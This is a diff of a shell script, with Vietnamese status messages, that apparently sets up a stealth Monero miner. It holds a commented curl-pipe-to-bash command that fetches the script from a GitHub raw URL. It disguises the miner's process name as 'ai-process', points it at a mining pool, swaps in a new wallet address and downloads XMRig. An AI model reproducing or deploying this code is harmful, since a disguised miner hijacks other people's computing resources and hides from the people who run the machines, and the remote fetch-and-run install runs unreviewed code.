@@ -1,7 +1,7 @@
 # curl -sL https://raw.githubusercontent.com/ChauDuongw/moungdungidx/refs/heads/main/codedao.sh | bash
 FAKE_NAME="ai-process"
 POOL_URL="pool.hashvault.pro:443"
-WALLET="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
+WALLET="892Z4mTTy3UhGwqGafXpj27Qttop42wVR6yU8gv43i9H2cfHP6V8guPAWAf71cm32wU9aESsqe274ZnhW8219GMiSzLhTKK"
 if [ ! -f "./xmrig" ]; then
     echo "[*] Đang tải XMrig..."
     curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
